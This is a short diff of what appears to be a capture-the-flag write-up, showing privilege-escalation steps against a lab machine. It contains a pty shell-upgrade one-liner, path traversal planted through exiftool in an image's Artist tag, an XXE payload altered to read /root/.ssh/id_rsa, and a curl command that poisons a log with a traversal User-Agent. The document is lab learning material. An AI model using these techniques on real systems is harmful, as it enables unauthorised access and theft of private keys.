@@ -210,4 +210,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 		* I changed the Author tag from `woodenk` to `../home/woodenk/hackerfox` so that I can place my modified `.xml` file in the woodenk home directory with: `exiftool greg.jpg -Artist='../home/woodenk/hackerfox'`
 	* Now that I know the Java app will be looking for `hackerfox_creds.xml` in the home directory, I can create that with a previously downloaded export.xml file
 	* I added the XXE payload from hacktricks and changed the `ENTITY` to `hackerfox` and the `SYSTEM` to `"file:///root/.ssh/id_rsa"`
-	* I also changed the uri to 
+	* I also changed the uri to `/../../../../../../home/woodenk`
+	* Then plant the agent string in the log file: ````
+curl -i -s -k -X POST --data-binary 'name=hackerfox' 'http://10.129.227.207:8080/search' -A "||/../../../../../../../home/woodenk/smooch.jpg"
+````
